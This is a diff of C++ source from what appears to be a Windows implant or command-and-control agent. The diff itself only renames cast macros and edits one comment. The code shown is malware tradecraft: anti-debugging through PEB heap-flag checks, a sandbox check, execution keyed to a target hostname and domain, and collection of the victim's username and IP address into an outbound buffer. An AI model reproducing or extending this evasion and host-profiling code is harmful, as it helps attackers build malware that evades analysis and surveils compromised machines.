@@ -64,12 +64,12 @@ namespace Opsec {
         HeapFlagsOffset 		= VistaOrGreater ? 0x40 : 0x0C;
         HeapForceFlagsOffset 	= VistaOrGreater ? 0x44 : 0x10;
 #else
-        pHeapBase               = C_PTR(*RCAST(ULONG_PTR*, RCAST(PBYTE, pPeb) + 0x30));
+        pHeapBase               = C_PTR(*R_CAST(ULONG_PTR*, R_CAST(PBYTE, pPeb) + 0x30));
         HeapFlagsOffset         = VistaOrGreater ? 0x70 : 0x14;
         HeapForceFlagsOffset    = VistaOrGreater ? 0x74 : 0x18;
 #endif
-        auto HeapFlags          = RCAST(ULONG_PTR*, SCAST(PBYTE, pHeapBase) + HeapFlagsOffset);
-        auto HeapForceFlags     = RCAST(ULONG_PTR*, SCAST(PBYTE, pHeapBase) + HeapForceFlagsOffset);
+        auto HeapFlags          = R_CAST(ULONG_PTR*, S_CAST(PBYTE, pHeapBase) + HeapFlagsOffset);
+        auto HeapForceFlags     = R_CAST(ULONG_PTR*, S_CAST(PBYTE, pHeapBase) + HeapForceFlagsOffset);
 
         ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
             ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
@@ -77,7 +77,7 @@ namespace Opsec {
     }
 
     VOID SeCheckSandbox() {
-        // check ACPI tables for vm vendors instead of just checking memory
+        // todo: check ACPI tables for vm vendors instead of just checking memory
         HEXANE
 
         MEMORYSTATUSEX stats = { };
@@ -103,7 +103,7 @@ namespace Opsec {
         }
 
         if (!Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
-            buffer = SCAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
                 if (Utils::GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
@@ -121,7 +121,7 @@ namespace Opsec {
         length = 0;
         if (Ctx->Config.Domain[0] != NULTERM) {
             if (!Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
-                buffer = SCAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+                buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
                 if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
                     if (Utils::GetHashFromStringA(Ctx->Config.Domain, x_strlen(Ctx->Config.Domain)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
@@ -141,7 +141,7 @@ namespace Opsec {
 
         length = 0;
         if (!Ctx->win32.GetUserNameA(buffer, &length)) {
-            buffer = SCAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            buffer = S_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetUserNameA(buffer, &length)) {
                 Stream::PackString(Outbound, buffer);
@@ -154,7 +154,7 @@ namespace Opsec {
 
         length = 0;
         if (Ctx->win32.GetAdaptersInfo(adapter, &length)) {
-            adapter = SCAST(PIP_ADAPTER_INFO, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            adapter = S_CAST(PIP_ADAPTER_INFO, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetAdaptersInfo(adapter, &length) == NO_ERROR) {
                 Stream::PackString(Outbound, adapter->IpAddressList.IpAddress.String);
